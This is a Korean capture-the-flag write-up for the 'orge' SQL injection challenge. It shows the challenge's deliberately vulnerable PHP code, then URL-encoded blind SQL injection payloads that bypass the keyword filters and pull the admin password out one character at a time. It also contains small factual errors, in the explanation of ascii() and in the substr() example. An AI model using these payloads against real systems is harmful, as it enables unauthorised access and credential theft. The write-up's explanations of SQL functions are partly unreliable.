# ORGE

## CODE
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보면 pw를 알아내야 하기 때문에 이 문제는 blind sql injection문제이다. 일단 admin의 계정이 되는지 확인을 하기 위해서 url 뒤에
```
?pw=' || id='admin'%23
```
위 코드를 입력을 하게 되면 앞에있던 id='guest'가 처리된뒤 id에 admin이 들어가게 되어서 Hello admin이라는 게 뜨게 된다.

다음으로는 이제 pw의 길이를 알아보기 위해서 url뒤에 
```
?pw=' || id='admin' %26%26 length(pw)=8%23
```
위 코드를 입력하게 되면 id에는 admin이들어가고 length함수로 인해서 admin의 pw길이를 알 수가 있다.

이제 id가 admin인 pw를 구하기 위해서는 url뒤에
```
?pw=' || id='admin' %26%26 ascii(substr(pw,1,1))=54%23
```
위 코드를 입력하게 되면 id가 admin인 pw의 첫자리가 ascii로 54인 6이라는 것을 알 수 있다. 이제 이것을 가지고 뒤에도 구해보면
```
?pw=' || id='admin' %26%26 ascii(substr(pw,2,1))=99%23
?pw=' || id='admin' %26%26 ascii(substr(pw,3,1))=56%23
?pw=' || id='admin' %26%26 ascii(substr(pw,4,1))=54%23
?pw=' || id='admin' %26%26 ascii(substr(pw,5,1))=52%23
?pw=' || id='admin' %26%26 ascii(substr(pw,6,1))=100%23
?pw=' || id='admin' %26%26 ascii(substr(pw,7,1))=101%23
?pw=' || id='admin' %26%26 ascii(substr(pw,8,1))=99%23
```
위 처럼 나오므로 pw는 6c864dec이다.

## length
length함수는 인자로 주어진 문자열의 길이를 구하는 것이다.

----

## ascii
문자열의 문자 값을 EBCDIC에서 ASCII 형식으로 변환 해주는 것이다.

----

## substr
```
substr(문자열, 시작index, 길이)
```
문자열에서 시작index부터 길이 만큼 잘라준다
```
ex) substr("Hello world!", 5, 5)
```
이러면 world가 추력이 된다.

--------